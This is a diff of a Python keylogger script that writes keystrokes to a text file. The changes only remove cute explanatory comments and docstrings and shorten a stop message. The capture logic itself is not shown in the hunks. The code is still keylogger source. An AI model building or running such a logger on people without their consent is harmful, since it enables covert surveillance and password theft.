@@ -9,7 +9,6 @@ import os                      # For file and path operations
 class KeyLogger:
     """
     A class that handles keyboard logging operations.
-    Think of this as a container for all our keylogger functions!
     """
     
     def __init__(self, filename="keyfile.txt"):
@@ -27,9 +26,8 @@ class KeyLogger:
         self.stop_event = threading.Event()
         
     def timestamp(self):
-        """
-        Creates a timestamp like '2025-03-16 13:42:47'
-        This is like writing the date and time in our notebook
+         """
+         Creates a timestamp 
         """
         return datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
@@ -72,17 +70,13 @@ class KeyLogger:
     def stop(self):
         """
         This is our shutdown procedure.
-        Like properly closing our notebook and putting away our pens.
         """
         # Tell the program it's time to stop
         self.stop_event.set()
         self.running = False
         
     def start(self):
-        """
-        This is where everything begins!
-        Like opening our notebook and getting ready to write.
-        """
+       
         # Set up our emergency stop button (Ctrl+C handler)
         signal.signal(signal.SIGINT, self.signal_handler)
         signal.signal(signal.SIGTERM, self.signal_handler)
@@ -97,18 +91,17 @@ class KeyLogger:
             # This is our main loop - it keeps the program running
             while self.running and not self.stop_event.is_set():
                 # Check every second if someone wants us to stop
-                # This is like taking a quick break to see if we should continue
                 self.stop_event.wait(timeout=1.0)
                 
             # When we're done, stop listening to the keyboard
             listener.stop()
             
-        print("\nKeylogger has stopped. Have a nice day!")
+        print("\nKeylogger has stopped.")
 
 # This is where our program actually starts
 if __name__ == "__main__":
-    # Create our keylogger (like getting a fresh notebook ready)
+    # Create our keylogger
     logger = KeyLogger()
     
-    # Start logging! (like opening the notebook and beginning to write)
+    # Start logging! 
     logger.start()
